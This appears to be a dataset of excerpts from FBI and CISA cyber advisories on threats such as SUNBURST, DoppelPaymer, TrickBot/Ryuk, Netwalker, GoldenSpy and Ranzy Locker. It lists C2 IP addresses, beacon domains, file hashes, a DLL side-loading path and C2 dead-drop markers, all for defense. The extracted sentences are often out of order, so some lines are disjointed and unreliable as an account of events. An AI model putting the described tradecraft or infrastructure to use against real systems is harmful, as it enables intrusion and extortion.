Advanced Persistent Threat Actors Leverage SolarWinds Vulnerabilities,2020-12-29,4,"{'threats_of_violence': 6, 'malware': 6}","Local Field Offices:  www.fbi.gov/contact-us/field- offices                                                 The following information is being provided by the FBI, with no  guarantees or warranties, for potential use at the sole discretion of  recipients to protect against cyber threats. Advanced Persistent Threat Actors Leverage  SolarWinds Vulnerabilities  Summary  Based on the wide ranging scope of the investigation into SolarWinds  Orion compromises by Advanced Persistent Threat (APT) actors and  fast paced release of private network analysis, the FBI is providing  cyber security professionals and system administrators collated and  verified information to assist in determining whether APT actors have  exploited the SolarWinds vulnerabilities present on their systems. Threat Details  Malicious actors are exploiting SolarWinds Orion products (affected  versions 2019.4 through 2020.2.1 HF1) containing SUNBURST malware  to gain access to network traffic management systems. Once the  malicious update is found on a network, cyber security professionals and system administrators must  determine whether the threat actor has used that vulnerability to pivot to a higher form of access. The list of those IP addresses is available at https://www.fireeye.com/blog/threat- research/2020/12evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst- backdoor.html [under “Network Command and Control (C2)”].

Recommendations  If an entity determines that they have downloaded the trojanized SolarWinds plug-in, they should  conduct additional research to determine whether or not their systems have been further  compromised. After installation, the malware beacons via DNS requests to resolve unique subdomains  of avsvmcloud[.]com between 12 and 14 days after installation, according to FireEye’s reporting. The malware operators are able to monitor the DNS beacons to determine if additional targeting of an  organization is desired. Some victims may have received a response that included an IP address designed to disable the  malware. Following receipt of a DNS response  indicating the network was to be further targeted, the malware moved additional communications to a  separate command and control address which would also make victim specific DNS queries."

DoppelPaymer Ransomware Attacks on Critical Infrastructure Impact Critical Services,2020-12-15,4,"{'extortion': 2, 'ransomware': 14, 'threats_of_violence': 5, 'malware': 1}","Prior to infecting systems with ransomware,  the actors’ exfiltrate data to use in extortion schemes and have made  follow-on telephone calls to victims to further pressure them to make  ransom payments. After German authorities contacted the actors through the provided  communication accounts, the actors withdrew the extortion attempt and provided a digital decryption  key upon learning patients’ lives were endangered, according to open source reporting about the  German investigation. DoppelPaymer Ransomware Attacks on  Critical Infrastructure Impact Critical Services   Summary  Since late August 2019, unidentified actors have used DoppelPaymer  ransomware to encrypt data from victims within critical industries  worldwide such as healthcare, emergency services, and education,  interrupting citizens’ access to services. Since its emergence in June  2019, DoppelPaymer ransomware has infected a variety of industries  and targets, with actors routinely demanding six- and seven-figure  ransoms in Bitcoin (BTC). Threat Details  DoppelPaymer ransomware attacks since June 2019 have negatively  impacted the provision of healthcare, emergency, and education  services to citizens worldwide. This individual later died, though  German authorities ultimately did not hold the ransomware actors responsible because the German  authorities felt the individual’s health was poor and the patient likely would have died even if they had  not been re-routed. In July 2019, DoppelPaymer actors infected 13 out of 380 servers used by an identified US medical  center with ransomware. The medical center required several weeks to restore their  systems from offsite backups following the ransomware attack. The ransomware was introduced via an Internet  Explorer/Edge browser after an employee viewed a cryptocurrency website. The ransomware was successful in encrypting files stored on the following platforms: Windows 7,  Windows 10, Server 2008, Server 2012, and Server 2016. Additional Tactics, Techniques, and Procedures  Doppelpaymer is one of the first ransomware variants where actors have called the victims to entice  payments. As of February 2020, in multiple instances, DoppelPaymer actors had followed ransomware  infections with calls to the victims to extort payments through intimidation or threatening to release  exfiltrated data. Paying a ransom may embolden  adversaries to target additional organizations, encourage other criminal actors to engage in the  distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the  ransom, the FBI urges you to report ransomware incidents to your local field office or the FBI’s Internet  Crime Complaint Center (IC3). Doing so provides investigators with the critical information they need  to track ransomware attackers, hold them accountable under U.S. Local Field Offices:  www.fbi.gov/contact-us/field- offices                                                   The following information is being provided by the FBI, with no  guarantees or warranties, for potential use at the sole discretion of  recipients to protect against cyber threats. In one case an actor, using a spoofed US-based telephone number while claiming to be  located in North Korea, threatened to leak or sell data from an identified business if the business did  not pay the ransom. During subsequent telephone calls to the same business, the actor threatened to  send an individual to the home of an employee and provided the employee's home address. The  malware infected servers at three of the college’s campuses but did not infect cloud-based  applications."
Cyber Actors Target K-12 Distance Learning Education to Cause Disruptions and Steal Data,2020-12-11,4,"{'phishing': 4, 'ransomware': 15, 'threats_of_violence': 6, 'malware': 12}","Tactics, such as phishing, trick victims into revealing  personal information (e.g., password or bank account information) or performing a task (e.g., clicking  on a link). These types of attacks are referred to  as Domain Spoofing or Homograph attacks. Because end users are targeted, make employees and  students aware of the threats—such as ransomware and phishing scams—and how they  are delivered.

Ransomware  The FBI, CISA, and MS-ISAC have received numerous reports of ransomware attacks against K-12  educational institutions. Adopting tactics previously leveraged against business and industry,  ransomware actors have also stolen—and threatened to leak—confidential student data to the public  unless institutions pay a ransom. According to MS-ISAC data, the percentage of reported ransomware incidents against K-12 schools  increased at the beginning of the 2020 school year. In August and September, 57% of ransomware  incidents reported to the MS-ISAC involved K-12 schools, compared to 28% of all reported  ransomware incidents from January through July.

Open/Exposed Ports  The FBI, CISA, and MS-ISAC frequently see malicious cyber actors exploiting exposed Remote  Desktop Protocol (RDP) services to gain initial access to a network and, often, to manually deploy  ransomware. Ransomware Best Practices  The FBI and CISA do not recommend paying ransoms. It may also embolden adversaries to target additional organizations, encourage other  criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. However,  regardless of whether your organization decided to pay the ransom, the FBI urges you to report  ransomware incidents to your local FBI field office. Doing so provides the FBI with the critical  information they need to prevent future attacks by identifying and tracking ransomware attackers and  holding them accountable under US law. Businesses and Organizations  Note: Contact your local FBI field office (www.fbi.gov/contact-us/field) for additional FBI products on  ransomware, edtech, and cybersecurity for educational institutions. THREAT DETAILS  As of December 2020, the FBI, CISA, and MS-ISAC continue to receive reports from K-12  educational institutions about the disruption of distance learning efforts by cyber actors. The FBI and CISA suggest K-12 educational institutions review or  establish patching plans, security policies, user agreements, and business continuity plans to ensure  they address current threats posed by cyber actors. To request incident response resources or technical assistance related to these threats, contact CISA  at Central@cisa.gov. Malware  Figure 1 identifies the top 10 malware strains that have affected state, local, tribal, and territorial  (SLTT) educational institutions over the past year (up to and including September 2020). Note: These  malware variants are purely opportunistic as they not only affect educational institutions but other  organizations as well. ZeuS and Shlayer are among the most prevalent malware affecting K-12 schools.   ZeuS is a Trojan with several variants that targets Microsoft Windows operating systems.   Shlayer is a Trojan downloader and dropper for MacOS malware.1 It is primarily distributed  through malicious websites, hijacked domains, and malicious advertising posing as a fake  Adobe Flash updater. Figure 1: Top 10 malware affecting SLTT educational institutions  Distributed Denial-of-Service Attacks  Cyber actors are causing disruptions to K-12 educational institutions—including third-party  services supporting distance learning—with distributed denial-of-service (DDoS) attacks,2  which temporarily limit or prevent users from conducting daily operations. 1 Shlayer is the only malware of the top 10 that targets MacOS; the other 9 affect Microsoft Windows operating  systems. In such scenarios, a victim could receive what appears to be legitimate email that:    Requests personally identifiable information (PII) (e.g., full name, birthdate, student ID),     Directs the user to confirm a password or personal identification number (PIN),     Instructs the recipient to visit a website that is compromised by the cyber actor, or     Contains an attachment with malware. They are then positioned to move laterally throughout a network  (often using SMB), escalate privileges, access and exfiltrate sensitive information, harvest  credentials, or deploy a wide variety of malware.   Set antivirus and anti-malware solutions to automatically update; conduct regular scans.

Addressing Risks Associated with Rail Industrial Internet of Things and Commercial Off-the-Shelf System Solutions,2020-12-08,4,"{'phishing': 1, 'ransomware': 2, 'threats_of_violence': 7, 'malware': 4}","Suspicious activities/indicators  include but are not limited to the following:     increased interest and discussions on cyber criminal forums about rail technology  vulnerabilities;   increased reporting from rail companies and city transit authorities of cyber intrusions,  such as phishing schemes or probing activities;   persistent and undue interest in rail equipment or communications technical information,  to include fail states, by individuals, including those who work in the rail industry but do  not require this information for their jobs;   procurement of rail infrastructure equipment by a person with no employment in or  business connections to the rail industry; examples include wayside devices or connected  braking systems. For example, the WannaCry ransomware targeted internet-connected  Windows 7 operating systems, impacting victims across multiple industries, including the  German rail sector. Additionally, cyber actors could deploy malware or execute  ransomware on devices capable of spreading throughout all connected rail infrastructure  networks, enabling theft of customer and employee data, physical disruptions, or the theft of  intellectual property. Local Field Offices:  http://www.fbi.gov/contact- us/field-offices   The following information is being provided by the FBI, with no  guarantees or warranties, for potential use at the sole discretion  of recipients to protect against cyber threats. TLP:WHITE    TLP:WHITE  COTS IoT in Industrial Networks  The increased integration of new devices and COTS systems increases potential entry points  malicious cyber actors or advanced persistent threats may attempt to exploit, which enables  cyber actors to more easily target multiple industries. Recent malicious cyber activity against  US rail entities demonstrates the importance of proactively addressing the cyber threat posed  to IIoT devices and solutions as rail entities continue to streamline and modernize operations.  If a vulnerability arises in a COTS system installed on or used by multiple rail networks,  cyber threat actors may be able to exploit the vulnerability to target multiple victims in  one attack. The ongoing evolution of the  cyber criminal threat increases the importance of proactively addressing cyber risk in critical  infrastructure networks. An exhaustive approach to this  indicator will rarely be practical; however, reporting on these activities will help rail  organizations become aware of these threats and consider them in the context of  common vulnerabilities. In addition to standard cybersecurity best practices and insider threat countermeasures, the  FBI has developed the following set of mitigation strategies and proactive measures that may  help freight and passenger rail companies protect the connected rail devices from  unauthorized access and exploitation. Remote accessibility increases the number of potential intrusion vectors a  malicious cyber actor could exploit for stealing data or introducing malware. While most of the cyber incidents only disrupted minor  operations, led to monetary losses, or resulted in malware being introduced into rail company  computer networks, one incident in Lodz, Poland, resulted in train derailments.c The most  recent breach, which occurred in August 2020, prevented a US transportation authority from  sharing travel information with its customers. To mitigate the spread of malware, the US  transportation authority temporarily shut down its real-time travel data sharing service and  suspended employee email, payroll, and remote timekeeping capabilities."

security posture. Leaders  •  Implement a training program to familiarize users with identifying social engineering  techniques and phishing emails. •  Be vigilant against tailored spearphishing attacks targeting corporate and personal accounts  (including both email and social media accounts). To request incident response resources or technical assistance related to these threats, contact CISA at  CISAServiceDesk@cisa.dhs.gov. TLP: WHITE  Advanced Persistent Threat Actors Targeting  U.S. See the ATT&CK for Enterprise for all referenced threat actor  tactics and techniques. The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation  (FBI) have observed persistent continued cyber intrusions by advanced persistent threat (APT) actors  targeting U.S. When successful, these  low-effort, high-reward approaches allow threat actors to steal sensitive information, acquire user  credentials, and gain persistent access to victim networks. Flag any known indicators  of compromise or threat actor behaviors for immediate response. •  Organizations can implement mitigations of varying complexity and restrictiveness to reduce  the risk posed by threat actors who use Tor (The Onion Router) to carry out malicious  activities. Foreign cyber threat actors continue to exploit publicly known—and often  dated—software vulnerabilities against broad target sets, including public and private sector  organizations. If these vulnerabilities are left unpatched, exploitation often requires few  resources and provides threat actors with easy access to victim networks. CONTACT INFORMATION  Recipients of this report are encouraged to contribute any additional information that they may have  related to this threat. To request incident response  resources or technical assistance related to these threats, contact CISA at Central@cisa.gov. •  Block certain websites and email attachments commonly associated with malware (e.g., .scr,  .pif, .cpl, .dll, .exe)."

Mitigations    Patch and Vulnerability Management:   Install vendor-provided and verified patches to all systems for critical vulnerabilities, prioritizing timely  patching of Internet-connected servers for known vulnerabilities and software processing Internet data,  such as web browsers, browser plugins, and document readers. The group used sophisticated tradecraft against a variety of targets, such as compromising  legitimate software for supply chain intrusions, using custom malware, deploying ransomware, and engaging  in crypto-jacking attacks. TLP:WHITE              TLP:WHITE    16 Sept 2020  Alert Number  AC-000133-TT      The following information is being provided by the FBI in collaboration with  the Cybersecurity and Infrastructure Security Agency (CISA), with no  guarantees or warranties, for potential use at the sole discretion of  recipients in order to protect against cyber threats. TLP:WHITE  TLP:WHITE  Threat  This sophisticated hacking group located in Chengdu, Sichuan Province, PRC, has been active since at least  2011.  Recommend that organizations routinely audit their configuration and patch management programs to  ensure they can track and mitigate emerging threats. Implementing a rigorous configuration and patch  management program will hamper sophisticated cyber threat actors’ operations and protect  organizations’ resources and information systems.  Leverage multi-sourced threat-reputation services for files, DNS, URLs, IPs, and email addresses. The group has also deployed “Skeleton Key” malware to create a  master password that will work for any account in the domain. This technique allowed the group to gain access into victim accounts using publicly available  exploit code against VPN services [T1133] or public facing applications [T1190] – without using their own  distinctive or identifying malware – so long as the group acted before victim companies updated their  systems. TLP:WHITE  TLP:WHITE  The group has used the following malware: gh0st, 9002, Zxshell, HK Door, XSLCMD, PlugX/Sogu, Derusbi,  HiKit, Crosswalk/ProxIP, Winnti/Pasteboy/Stone/Treadstone, Azazel, PoisonPlug/Barlaiy/ShadowPad,  metasploit-meterpreter, and Cobalt Strike. The group  frequently implanted malware in “%WINDIR%\Windows\System32\wbem\loadperf.dll” to side-jack of the  proper ""loadperf.dll"" file located in the ""%WINDIR%\Windows\System32\"" directory. This technique has been used to  launch HK Door, Crosswalk, and other malware. These actors also created “C2 dead drops” (C2DD) [T1102.001], whereby they programmed their malware to  contact these C2DD accounts on publicly available web pages. Specifically, C2DD pages included what might appear to be random strings of text,  with the relevant malware programmed to recognize the text strings—which typically started and/or ended  with a pre-programmed “anchor text”—converting them into actor-controlled IP addresses or C2 domains. For example, PlugX/Sogu/Fast malware used by the group used encoded text sandwiched between “DZKS”  and “DZJS”. The malware would then cause the victim computers to communicate with the servers hosting  those IP addresses or C2 domains."

This advisory describes the tactics, techniques, and procedures (TTPs) used by  cybercriminals against targets in the Healthcare and Public Health Sector (HPH) to infect systems  with ransomware, notably Ryuk and Conti, for financial gain. Key Findings    CISA, FBI, and HHS assess malicious cyber actors are targeting the HPH Sector with TrickBot  and BazarLoader malware, often leading to ransomware attacks, data theft, and the disruption  of healthcare services. These activities include  credential harvesting, mail exfiltration, cryptomining, point-of-sale data exfiltration, and the  deployment of ransomware, such as Ryuk and Conti. Campaigns using  Bazar represent a new technique for cybercriminals to infect and monetize networks and have  increasingly led to the deployment of ransomware, including Ryuk. BazarLoader has become one of  the most commonly used vectors for ransomware deployment.   45[.]148[.]10[.]92     170[.]238[.]117[.]187    177[.]74[.]232[.]124    185[.]68[.]93[.]17    203[.]176[.]135[.]102    96[.]9[.]73[.]73    96[.]9[.]77[.]142    37[.]187[.]3[.]176    45[.]89[.]127[.]92    62[.]108[.]35[.]103    91[.]200[.]103[.]242    103[.]84[.]238[.]3    36[.]89[.]106[.]69    103[.]76[.]169[.]213    36[.]91[.]87[.]227    105[.]163[.]17[.]83    185[.]117[.]73[.]163    5[.]2[.]78[.]118    185[.]90[.]61[.]69    185[.]90[.]61[.]62    86[.]104[.]194[.]30    31[.]131[.]21[.]184    46[.]28[.]64[.]8    104[.]161[.]32[.]111    107[.]172[.]140[.]171    131[.]153[.]22[.]148    195[.]123[.]240[.]219    195[.]123[.]242[.]119    195[.]123[.]242[.]120    51[.]81[.]113[.]25                                                  1 FireEye: Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser                 Page 13 of 22 |  Product ID: AA20-302A  TLP:WHITE  CISA  | FBI  | HHS  TLP:WHITE   74[.]222[.]14[.]27  Ryuk Ransomware  Typically Ryuk has been deployed as a payload from banking Trojans such as TrickBot.2 Ryuk first  appeared in August 2018 as a derivative of Hermes 2.1 ransomware, which first emerged in late 2017  and was available for sale on the open market as of August 2018. In other parts of the  ransomware code, Ryuk has removed or replaced features of Hermes, such as the restriction against  targeting specific Eurasia-based systems. In addition, the attackers will attempt to shut down or uninstall security applications on the victim  systems that might prevent the ransomware from executing. The RyukReadMe file placed on the system after encryption provides either one or two email   addresses, using the end-to-end encrypted email provider Protonmail, through which the victim can                                                  2 See the United Kingdom (UK) National Cyber Security Centre (NCSC) advisory, Ryuk Ransomware Targeting  Organisations Globally, on their ongoing investigation into global Ryuk ransomware campaigns and associated  Emotet and TrickBot malware. Ransomware Best Practices  CISA, FBI and HHS do not recommend paying ransoms. It may also embolden adversaries to target additional organizations, encourage other  criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. TrickBot infections may be indicators  of an imminent ransomware attack; system administrators should take steps to secure network  devices accordingly. GENERAL RANSOMWARE MITIGATIONS — HPH SECTOR  This section is based on CISA and Multi-State Information Sharing and Analysis Center (MS-ISAC)'s  Joint Ransomware Guide, which can be found at https://www.cisa.gov/publication/ransomware-guide. CISA, FBI, and HHS recommend that healthcare organizations implement both ransomware  prevention and ransomware response meaures immediately. Ransomware Prevention  Join and Engage with Cybersecurity Organizations  CISA, FBI, and HHS recommend that healthcare organizations take the following initial steps:    Join a healthcare information sharing organization, H-ISAC:  o Health Information Sharing and Analysis Center (H-ISAC): https://h- isac.org/membership-account/join-h-isac/   o Sector-based ISACs - National Council of ISACs:  https://www.nationalisacs.org/member-isacs   o Information Sharing and Analysis Organization (ISAO) Standards Organization:  https://www.isao.org/information-sharing-groups/     Engage with CISA and FBI, as well as HHS—through the HHS Health Sector Cybersecurity  Coordination Center (HC3)—to build a lasting partnership and collaborate on information  sharing, best practices, assessments, and exercises. o CISA: cisa.gov, https://us-cert.cisa.gov/mailing-lists-and-feeds,   o FBI: ic3.gov, www.fbi.gov/contact-us/field-offices   o HHS/HC3: http://www.hhs.gov/hc3,   Engaging with the H-ISAC, ISAO, CISA, FBI, and HHS/HC3 will enable your organization to receive  critical information and access to services to better manage the risk posed by ransomware and other  cyber threats.

TECHNICAL DETAILS  Threat Details  The cybercriminal enterprise behind TrickBot, which is likely also the creator of BazarLoader  malware, has continued to develop new functionality and tools, increasing the ease, speed, and  profitability of victimization. These threat actors increasingly use loaders—like TrickBot and  BazarLoader (or BazarBackdoor)—as part of their malicious cyber campaigns. Indicators                 Page 12 of 22 |  Product ID: AA20-302A  TLP:WHITE  CISA  | FBI  | HHS  TLP:WHITE In addition to TrickBot and BazarLoader, threat actors are using malware, such as KEGTAP,  BEERBOT, SINGLEMALT, and others as they continue to change tactics, techniques, and  procedures in their highly dynamic campaign.1 The following C2 servers are known to be associated  with this malicious activity. CISA, FBI, and HHS suggest HPH Sector organizations review or establish patching  plans, security policies, user agreements, and business continuity plans to ensure they address  current threats posed by malicious cyber actors.

Automating updates and  patches is critical because of the speed at which threat actors create exploits after a patch is  released. Without rapid and thorough patch application, threat actors can operate inside  a defender’s patch cycle.3 In addition to updating the application, use tools (e.g., the OWASP  Dependency-Check Project tool4) to identify publicly known vulnerabilities in third-party libraries that  the application depends on.

Indicators Associated with Netwalker Ransomware,2020-09-29,3,"{'phishing': 2, 'ransomware': 5, 'threats_of_violence': 1, 'malware': 1}","In March 2020, actors using Netwalker began exploiting COVID-19 fears by luring  unsuspecting victims with pandemic related phishing e-mails. Specifically,  Netwalker spread through a Visual Basic Scripting (VBS) script attached to COVID- 19 phishing e-mails that executed the payload once opened. Indicators Associated with Netwalker Ransomware   Summary      As of June 2020, the FBI has received notifications of Netwalker ransomware  attacks on U.S. In order to encrypt the user files on a victim network, the actors typically launch a malicious PowerShell script  embedded with the Netwalker ransomware executable. Paying a ransom may embolden adversaries to  target additional organizations, encourage other criminal actors to engage in the distribution of ransomware,  and/or may fund illicit activities. Regardless of whether you or your  organization have decided to pay the ransom, the FBI urges you to report ransomware incidents to your local field  office or the FBI’s Internet Crime Complaint Center (IC3). Doing so provides investigators with the critical  information they need to track ransomware attackers, hold them accountable under U.S. If you find any of  these indicators on  your networks, or  have related  information, please  contact your local  Cyber Task Force    Local Field Offices:  https://www.fbi.gov/  contact-us/field- offices      The following information is being provided by the FBI, with no guarantees or  warranties, for potential use at the sole discretion of recipients in order to protect  against cyber threats.  Install and regularly update anti-virus or anti-malware software on all hosts."

The malware comprised two components: a  dropper and an encrypted Microsoft CAB file. The CAB file is named depot.dat and contains four files that  make up the second stage of the malware. Dropper Files  Filenames:  installer.exe   svchost.exe  MD5 Hash:  fcc61b3a0277c47748a185dccccad5d8       TLP:WHITE              TLP:WHITE  Depot.dat Files  Filename:  depot.dat  MD5 Hash:  4d8e2fdb16877f693d8e90410f90a164  ce456b20f6cb4d5d74f00d976e2e7a91  Dropper Details    The dropper decrypted the depot.dat file and established a persistent mechanism for the malware. Because the malware  ensures that the seed is less than 0x10000, this limits the options for the generation of a key significantly and  the potential passwords that could be used. Bootui.dll opens and deobfuscates the configuration file, mlp.dat, as well as performs the majority of  the malware’s data collection and packaging functionality.

Well-maintained anti-virus software may prevent  use of commonly deployed attacker tools that are delivered via spear phishing. Reputation services can be used to detect or prevent low- reputation email addresses, files, URLs, and IP addresses used in spear-phishing attacks. Application control software limits users so they can only  execute applications and code allowed by the organization, rendering malicious  executables delivered via spear phishing unable to execute. Users who browse the internet, use email, and  execute code with administrator privileges make spear phishing much more effective by  enabling attackers to move laterally across a network, gain additional accesses, and  access highly sensitive information.

"Chinese Government-Mandated Tax Software Contains Malware, Enabling Backdoor Access",2020-07-28,3,"{'threats_of_violence': 2, 'malware': 6}","The following information is being provided by the FBI, with no  guarantees or warranties, for potential use at the sole discretion of  recipients in order to protect against cyber threats. As previously highlighted in FBI PIN 20200521-001  released on 21 May 2020 and the US Department of Homeland Security’s joint advisory with  Britain’s National Cyber Security Centre, hackers continue to “actively target organizations that  include healthcare bodies, pharmaceutical companies, academia, medical research organizations,  and local governments.”  Threat    Baiwang and Aisino are the only government-authorized tax software service providers to operate  the Chinese value added tax (VAT) system. Chinese Government-Mandated Tax Software  Contains Malware, Enabling Backdoor Access     Summary    The FBI seeks to inform US companies in the healthcare, chemical, and  finance sectors of potential targeting activity by the Chinese  government against their business and operational components based  in China. As early as March 2019, at least two Western companies  operating in China detected malware that was delivered through  Chinese vendors that were responsible for releasing tax software  upgrades following changes in 2018 to China’s value-added tax (VAT). The malware launched a backdoor into victim systems, which the FBI  assesses likely allows cyber actors to preposition to conduct remote  code execution and exfiltration activities on the victim’s network. In April 2019, employees of the pharmaceutical company discovered that the  software contained malware that created a backdoor on the company’s network. In June 2020, a private cybersecurity firm reported that Intelligence Tax, a tax software from Aisino  Corporation that is required by a Chinese bank under the same VAT system, likely contained  malware that installed a hidden backdoor to the networks of organizations using the tax software. The malware, named GoldenSpy, was designed to provide cyber actors with unfettered access to  victim networks and is believed to have been around since 2016."

Kwampirs Malware Employed in Ongoing  Cyber Supply Chain Campaign Targeting Global  Industries, including Healthcare Sector    Summary  Since at least 2016, the FBI has observed an Advanced Persistent Threat  (APT) actor conduct a global network exploitation campaign using the  Kwampirs Remote Access Trojan (RAT) and is providing additional, non- technical information in an effort to highlight key objectives of the  actor campaign. The FBI has not seen the Kwampirs RAT incorporating a wiper or  destructive module components; however, through comparative  forensic analysis, several code-based similarities exist with the data  destruction malware Disttrack (commonly known as Shamoon). During these campaigns, the Kwampirs  RAT performed daily command and control communications with malicious IP addresses and  domains that were hard-coded in the Kwampirs RAT malware. The first phase establishes a broad and  persistent presence on the targeted network, to include delivery and execution of secondary  malware payload(s).

Ransomware Actors Use Significant Financial Events and Stock Valuation to Facilitate Targeting and Extortion of Victims,2021-11-01,4,"{'extortion': 4, 'ransomware': 20, 'threats_of_violence': 4, 'malware': 4}","TLP:WHITE   TLP:WHITE   01 November 2021  20211101-001  Ransomware Actors Use Significant Financial Events and Stock  Valuation to Facilitate Targeting and Extortion of Victims     Summary  The FBI assesses ransomware actors are very likely using significant financial events, such as  mergers and acquisitions, to target and leverage victim companies for ransomware infections. During the initial reconnaissance phase,  cyber criminals identify non-publicly available information, which they threaten to release or  use as leverage during the extortion to entice victims to comply with ransom demands. Impending events that could affect a victim’s stock value, such as announcements, mergers,  and acquisitions, encourage ransomware actors to target a network or adjust their timeline for  extortion where access is established.  In early 2020, a ransomware actor using the moniker “Unknown” made a post on the  Russian hacking forum “Exploit” that encouraged using the NASDAQ stock exchange to  influence the extortion process. Prior to an attack, ransomware actors research publicly available information, such as a victim’s  stock valuation, as well as material nonpublic information. If victims do not pay a ransom  quickly, ransomware actors will threaten to disclose this information publicly, causing potential  investor backlash. TLP:WHITE  TLP:WHITE         Threat  Ransomware actors are targeting companies involved in significant, time-sensitive financial  events to incentivize ransom payment by these victims. Ransomware is often a two-stage  process beginning with an initial intrusion through a trojan malware, which allows an access  broker to perform reconnaissance and determine how to best monetize the access. However,  while this malware is often mass distributed, most victims of trojans are not also victims of  ransomware, indicating ransomware targets are often carefully selected from a pool based on  information gleaned from the initial reconnaissance. Following this posting, unidentified ransomware actors  negotiating a payment with a victim during a March 2020 ransomware event stated,  “We have also noticed that you have stocks. If you will not engage us for negotiation we  will leak your data to the nasdaq and we will see what's gonna (sic) happen with your  stocks.”   Between March and July 2020, at least three publicly traded US companies actively  involved in mergers and acquisitions were victims of ransomware during their respective  negotiations.  A November 2020 technical analysis of Pyxie RAT, a remote access trojan that often  precedes Defray777/RansomEXX ransomware infections, identified several keyword  searches on a victim’s network indicating an interest in the victim’s current and near  future stock share price. TLP:WHITE  TLP:WHITE        In April 2021, Darkside ransomware4 actors posted a message on their blog site to show  their interest in impacting a victim’s share price. Paying a ransom emboldens  adversaries to target additional organizations, encourages other criminal actors to engage in  the distribution of ransomware, and/or may fund illicit activities. Regardless of whether you or your organization  have decided to pay the ransom, the FBI urges you to report ransomware incidents to your local  FBI field office. Doing so provides the FBI with the critical information they need to prevent  future attacks by identifying and tracking ransomware attackers and holding them accountable  under US law. 4 Darkside is a ransomware-as-a-service variant, in which criminal affiliates conduct the attacks and the proceeds  are shared with the ransomware developer(s). Darkside ransomware was used in the May 2021 Colonial Pipeline  intrusion. o The Cybersecurity and Infrastructure Security Agency-Multi-State Information  Sharing & Analysis Center Joint Ransomware Guide covers additional best  practices and ways to prevent, protect, and respond to a ransomware attack. o StopRansomware.gov is the U.S. Government’s official one-stop location for  resources to tackle ransomware more effectively.

Paying a ransom may  embolden adversaries to target additional organizations, encourage other criminal actors  to engage in the distribution of ransomware, or fund illicit activities. Regardless of whether  you or your organization decides to pay the ransom, the FBI urges you to report  ransomware incidents to your local field office. Doing so provides investigators and  analysts with the critical information they need to track ransomware attackers, hold them  accountable under US law, and prevent future attacks. • Review the following additional resources:   o CISA’s analysis report and malware analysis report on FiveHands  ransomware provide analysis of a threat actor’s tactics, techniques, and  procedures used in a successful cyberattack; indicators of compromise; and  recommended mitigations to protect against, detect, and respond to  potential FiveHands ransomware attacks. o The Cybersecurity and Infrastructure Security Agency-Multi-State  Information Sharing & Analysis Center Joint Ransomware Guide covers  additional best practices and ways to prevent, protect, and respond to a  ransomware attack. o StopRansomware.gov is the US Government’s official one-stop location for  resources to tackle ransomware more effectively. If your organization is impacted by a ransomware incident, the FBI and CISA  recommend the following actions:         TLP:WHITE /       TLP:WHITE       • Isolate the infected system. Power-off and segregate any additional  computers or devices that share a network with the infected computer(s), even if  they have not been fully encrypted by ransomware. In some cases, if the victim does not respond quickly or does not pay  the ransom, the threat actors will launch a Distributed Denial of Service (DDoS) attack  on the victim company’s public facing website. If no ransom is paid, the threat actors  will post victim data to the Babuk site (payload.bin) or sell it to a third-party data broker. Once inside the network, the threat actor will use  publicly available penetration tool suites such as Cobalt Strike, Mandiant’s Commando,  or   PowerShell Empire preloaded with publicly available tools like Bloodhound and   Mimikatz to map the network and escalate privileges before exfiltration and encryption. • Monitor cyber threat reporting regarding the publication of compromised VPN  login credentials and change passwords and settings, if applicable. The FBI may seek the following information:   • Recovered executable files    • Live memory (RAM) capture    • Images of infected systems     • Malware samples    • IP addresses identified as malicious or suspicious    • Email addresses of the attackers    • A copy of the ransom note    • Ransom amount   • Bitcoin wallets used by the attackers          TLP:WHITE /       TLP:WHITE       • Bitcoin wallets used to pay the ransom   • Post-incident forensic reports         Recommended Mitigations   • Back-up critical data offline. • Install and regularly update anti-virus or anti-malware software on all hosts. If  possible, scan your backup data with an antivirus program to check that it is free of  malware."
Indicators of Compromise Associated with Ranzy Locker Ransomware,2021-10-26,4,"{'phishing': 1, 'extortion': 1, 'ransomware': 9, 'threats_of_violence': 1}","Recent victims  reported the actors leveraged known Microsoft Exchange Server vulnerabilities and phishing as  the means of compromising their networks. In an example of double extortion techniques, Ranzy actors in some cases  have demanded a second ransom from the victim in exchange for not leaking the data on the  Internet. TLP: WHITE  TLP: WHITE  25 Oct 2021  CU-000153-MW  Indicators of Compromise Associated with Ranzy Locker  Ransomware    Summary  The FBI first identified Ranzy Locker ransomware in late 2020 when the variant began to target  victims in the United States. Unknown cyber criminals using Ranzy Locker ransomware had  compromised more than 30 US businesses as of July 2021. Newly created accounts with the name “felix” have been  observed on at least three victims of the ransomware. Ransom Note    The ransom note for Ranzy Locker has similarities to the wording in both the AKO and ThunderX  ransom notes.1 An example of the notes is below:    The key found in the ransom note is a base64 encoded string, which when decoded reads:    {""ext"":"".ranzy"",""network"":""true/false"",""subID"":""####"",""lang"":""xx-XX.""}                                                               1 Around October 2020 both AKO and ThunderX rebranded themselves as Ranzy Locker Ransomware. Ransomware Executable    The name of the Ranzy Locker executable is the subID found in the key on the ransom note.

Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement. CISA |  FBI | NSA  Page 5 of 7  |  Product ID: AA21-291A  TLP: WHITE TLP:WHITE  •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting the  ransomware, implement a tool that logs and reports all network traffic, including lateral  movement activity on a network. Given that there has been an observed increase in ransomware attacks during non- business hours, especially holidays and weekends, CISA, the FBI, and NSA recommend  organizations:  •  Implement time-based access for accounts set at the admin level and higher. Refer to the CISA-Multi-State information and Sharing Center (MS-ISAC) Joint Ransomware Guide  for general mitigations to prepare for and reduce the risk of compromise by ransomware attacks. Note: critical infrastructure organizations with industrial control systems/operational technology  networks should review joint CISA-FBI Cybersecurity Advisory AA21-131A: DarkSide Ransomware:  Best Practices for Preventing Business Disruption from Ransomware Attacks for more mitigations,  including mitigations to reduce the risk of severe business or functional degradation should their entity  fall victim to a ransomware attack. RESPONDING TO RANSOMWARE ATTACKS  If a ransomware incident occurs at your organization, CISA, the FBI, and NSA recommend:  •  Following the Ransomware Response Checklist on p. 11 of the CISA-Multi-State  Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide. Paying a  ransom may embolden adversaries to target additional organizations, encourage other 